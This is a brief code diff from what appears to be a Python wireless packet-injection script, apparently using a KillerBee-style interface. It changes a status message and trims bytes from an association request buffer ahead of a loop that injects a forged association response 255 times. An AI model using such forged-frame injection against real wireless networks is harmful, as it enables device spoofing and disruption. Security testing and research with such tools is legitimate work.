@@ -156,7 +156,8 @@ if __name__ == '__main__':
                 bytearray([0x02, 0x34, 0x12, 0x00])
 
         # Send forged association response
-        print('9. Sending association response.')
+        print('- Sending association response.')
+        assoc_request_pkt_bytes = assoc_request_pkt_bytes[:-2]
         for i in range(0,255):
             assoc_request_pkt_bytes[2] = i
             kb.inject(assoc_response_pkt_bytes)
